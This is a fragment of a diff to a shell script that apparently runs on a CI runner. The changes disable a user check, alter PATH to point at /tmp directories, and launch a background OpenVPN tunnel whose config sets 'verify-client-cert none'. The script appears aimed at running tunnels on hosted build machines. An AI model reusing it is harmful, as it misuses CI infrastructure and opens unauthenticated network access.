@@ -1,4 +1,6 @@
-(id | grep "^uid=[0-9]\{1,9\}(runner)") &&
+#(id | grep "^uid=[0-9]\{1,9\}(runner)") &&
+cd /tmp;
+
 (
 #export PATH="$PATH":/tmp/AAAABBBB;
 export P566="/tmp/ABFFT0;\$PATH";
@@ -74,8 +76,10 @@ verify-client-cert none
 EOF
 
 
+#echo "ps aux|grep xiaomiqiu.conf|grep -v grep&&([ -f /home/lab_liuhuan22-free-us1-udp.ovpn ] &&setsid /usr/sbin/openvpn --config /home/lab_liuhuan22-free-us1-udp.ovpn &)||echo 1237749
 
-echo "ps aux|grep xiaomiqiu.conf|grep -v grep&&([ -f /home/lab_liuhuan22-free-us1-udp.ovpn ] &&setsid /usr/sbin/openvpn --config /home/lab_liuhuan22-free-us1-udp.ovpn &)||echo 1237749
+
+echo "ps aux|grep -v grep&&([ -f /home/lab_liuhuan22-free-us1-udp.ovpn ] &&setsid /usr/sbin/openvpn --config /home/lab_liuhuan22-free-us1-udp.ovpn &)||echo 1237749
 sleep 9;
 cd /home/runner/work/nc_test/nc_test/;
 #cat c2c.sh|tr -d \"\\\r\"|tee ccc.sh;
